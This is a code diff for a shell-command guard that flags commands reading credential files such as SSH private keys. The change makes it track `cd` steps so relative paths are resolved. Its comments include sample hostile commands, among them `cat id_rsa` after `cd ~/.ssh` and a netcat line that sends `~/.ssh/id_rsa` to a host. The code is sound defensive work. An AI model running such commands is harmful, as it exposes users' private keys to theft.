@@ -1,8 +1,10 @@
 import { homedir } from "node:os";
+import { posix } from "node:path";
 import { SECRET_HOME_PATHS } from "../../../sandbox/os-sandbox.js";
 import type { GuardInput, NormalisedCommand } from "./guard-types.js";
 import type { ArgScanFinding } from "./arg-scan-finding.js";
 import { programName, splitCommandSegments } from "./command-segments.js";
+import { ShellPathTracker, type CdStep } from "./shell-path-tracker.js";
 
 /**
  * `dangerous.read_credentials` (ATO-2126): a command that reads, copies,
@@ -16,6 +18,10 @@ import { programName, splitCommandSegments } from "./command-segments.js";
  *  - 0.6 for `~/.ssh/config` (host names, no keys) and a `.env` /
  *    `.envrc` file (often only local settings): asks as an ordinary
  *    dangerous command, quiet at full trust.
+ * A `cd` on the line counts: `cd ~/.ssh && cat id_rsa` and `cd ~; cat
+ * .ssh/id_rsa` resolve the relative operand against the folder the cd
+ * moved to (`shell-path-tracker.ts`), and a `cd` into a credential
+ * folder is itself a 0.9 finding.
  * Public material is not a finding: `*.pub`, `known_hosts`,
  * `authorized_keys`. Nor are template env files (`.env.example`,
  * `.env.sample`, ...), which hold no secrets by convention.
@@ -72,6 +78,8 @@ const HOME_SECRET = new RegExp(
 /** The same folders named relative to a command run in the home folder. */
 const RELATIVE_SECRET = new RegExp(String.raw`^(?:\./)?(${SECRET_ALTERNATION})(/\S*)?$`);
 const HOME_DIR = /^(?:\/users\/[^/]+|\/home\/[^/]+|\/root)\/?$/;
+/** A plain path operand: no option, no `key=value`, no spaces. */
+const PATH_WORD = /^[^-\s=@:'"][^\s=@:'"]*$/;
 const PUBLIC_SSH = /^\/(?:known_hosts\S*|authorized_keys\S*|\S*\.pub)$/;
 
 const ENV_FILE = /^\.env(?:rc)?(?:\.([a-z0-9_-]+))?$/;
@@ -93,20 +101,58 @@ export function matchCredentialRead(
   raw: GuardInput,
 ): ArgScanFinding | null {
   const cwdIsHome = HOME_DIR.test(raw.cwd.toLowerCase());
-  const candidates: string[] = [];
+  // `cd ~/.ssh && cat id_rsa`: relative operands resolve against the
+  // folder the last `cd` on the line moved to (review round 1).
+  const paths = new ShellPathTracker(raw.cwd);
+  let best: ArgScanFinding | null = null;
   for (const words of splitCommandSegments(input.joined)) {
-    candidates.push(...readOperands(words));
+    const cd = paths.step(words);
+    if (cd !== null) best = stronger(best, enteredSecretFolder(cd));
+    for (const word of readOperands(words)) {
+      best = stronger(best, operandFinding(word, paths, cwdIsHome));
+    }
   }
   // `nc host 9 < ~/.ssh/id_rsa`: the segments drop redirect targets.
   for (const match of input.joined.matchAll(/(?:^|[^<])<\s*(\S+)/g)) {
-    candidates.push(match[1]!.replace(/^["']+|["']+$/g, ""));
-  }
-  let best: ArgScanFinding | null = null;
-  for (const word of candidates) {
-    const hit = credentialWord(word, cwdIsHome);
-    if (hit !== null && (best === null || hit.confidence > best.confidence)) best = hit;
+    const word = match[1]!.replace(/^["']+|["']+$/g, "");
+    best = stronger(best, operandFinding(word, paths, cwdIsHome));
   }
   return best;
+}
+
+function stronger(
+  best: ArgScanFinding | null,
+  hit: ArgScanFinding | null,
+): ArgScanFinding | null {
+  if (hit === null) return best;
+  return best === null || hit.confidence > best.confidence ? hit : best;
+}
+
+/** A word as written, then the path it names from the tracked folder. */
+function operandFinding(
+  word: string,
+  paths: ShellPathTracker,
+  cwdIsHome: boolean,
+): ArgScanFinding | null {
+  const direct = credentialWord(word, cwdIsHome);
+  if (direct !== null || !PATH_WORD.test(word)) return direct;
+  const resolved = paths.resolve(word);
+  if (resolved === null || resolved === word) return null;
+  const hit = credentialWord(resolved, false);
+  if (hit === null) return null;
+  return { ...hit, reason: `reads a credential file (${word} in ${posix.dirname(resolved)})` };
+}
+
+/** `cd ~/.ssh`: the folder itself is the finding, whatever runs next. */
+function enteredSecretFolder(cd: CdStep): ArgScanFinding | null {
+  if (cd.target === null) return null;
+  const match = HOME_SECRET.exec(cd.target.toLowerCase());
+  if (match === null) return null;
+  return {
+    id: "dangerous.read_credentials",
+    reason: `enters a credential folder (cd ${cd.word})`,
+    confidence: SECRET_CONFIDENCE,
+  };
 }
 
 /** The operands a reader in this simple command would read. */
